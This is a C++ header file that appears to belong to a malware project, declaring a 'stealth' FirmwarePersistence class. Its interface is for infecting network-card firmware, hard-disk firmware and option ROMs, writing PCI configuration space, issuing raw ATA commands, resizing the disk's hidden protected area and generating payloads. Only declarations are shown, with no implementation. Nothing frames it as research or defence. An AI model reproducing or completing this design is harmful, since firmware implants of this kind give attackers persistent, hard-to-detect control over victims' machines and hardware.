#pragma once
#include <diarna/compiler_port.hpp>
#include <cstdint>
#include <string>
#include <vector>

namespace diarna::stealth {

class FirmwarePersistence {
public:
    static FirmwarePersistence& instance();

    bool initialize();

    struct SpiFlashInfo {
        uint32_t bus, device, function;
        uint16_t vendor_id, device_id;
        std::string description;
        uint32_t flash_size;
        bool writable, infected;
    };

    std::vector<SpiFlashInfo> discover_devices();

    bool infect_nic_firmware(uint32_t index);
    bool infect_hdd_firmware(uint32_t drive_number);
    bool infect_option_rom(uint32_t index);

    bool deploy_all();
    bool remove_all();

private:
    FirmwarePersistence();

    bool read_pci_config(uint8_t bus, uint8_t dev, uint8_t func,
                         uint32_t offset, void* buf, size_t len);
    bool write_pci_config(uint8_t bus, uint8_t dev, uint8_t func,
                          uint32_t offset, const void* buf, size_t len);
    bool send_ata_command(HANDLE drive, uint8_t cmd, uint8_t feat,
                          void* data, size_t sz, bool write);
    bool read_hpa(HANDLE drive, uint64_t& native_max);
    bool set_hpa_max(HANDLE drive, uint64_t max_sectors);

    std::vector<uint8_t> generate_payload(size_t max_size);

    std::vector<SpiFlashInfo> devices_;
};

} // namespace diarna::stealth
